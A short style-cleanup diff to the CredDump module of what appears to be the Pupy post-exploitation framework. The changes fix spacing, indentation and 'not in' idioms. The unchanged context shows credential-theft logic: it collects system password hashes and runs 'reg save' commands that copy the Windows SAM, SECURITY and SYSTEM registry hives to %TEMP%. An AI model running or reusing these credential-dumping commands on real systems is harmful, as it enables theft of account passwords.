@@ -68,7 +68,7 @@ class CredDump(PupyModule):
                 'Login': hsh[0],
                 'Category': 'System hash',
                 'CredType': 'hash'
-            } for hsh in hashes ])
+            } for hsh in hashes])
 
             for hsh in hashes:
                 self.log('{}'.format(hsh))
@@ -83,7 +83,7 @@ class CredDump(PupyModule):
 
         def add_hashes(line):
             user, hsh, rest = line.split(':', 2)
-            if not hsh in ('!','*','x') and not (user, hsh) in known:
+            if hsh not in ('!','*','x') and (user, hsh) not in known:
                 known.add((user, hsh))
                 hashes.append(line)
 
@@ -172,7 +172,7 @@ class CredDump(PupyModule):
         self.success("saving SYSTEM hives in %TEMP%...")
         cmds = ("reg save HKLM\\SYSTEM %TEMP%/SYSTEM", "reg save HKLM\\SECURITY %TEMP%/SECURITY", "reg save HKLM\\SAM %TEMP%/SAM")
         if is_vista:
-            cmds = ( x+' /y' for x in cmds )
+            cmds = (x+' /y' for x in cmds)
 
         for cmd in cmds:
             self.info("running %s..." % cmd)
@@ -262,9 +262,9 @@ class CredDump(PupyModule):
         N=0
         result=''
         while src:
-           s,src = src[:length],src[length:]
-           hexa = ' '.join(["%02X"%ord(x) for x in s])
-           s = s.translate(FILTER)
-           result += "%04X   %-*s   %s\n" % (N, length*3, hexa, s)
-           N+=length
+            s,src = src[:length],src[length:]
+            hexa = ' '.join(["%02X"%ord(x) for x in s])
+            s = s.translate(FILTER)
+            result += "%04X   %-*s   %s\n" % (N, length*3, hexa, s)
+            N+=length
         return result
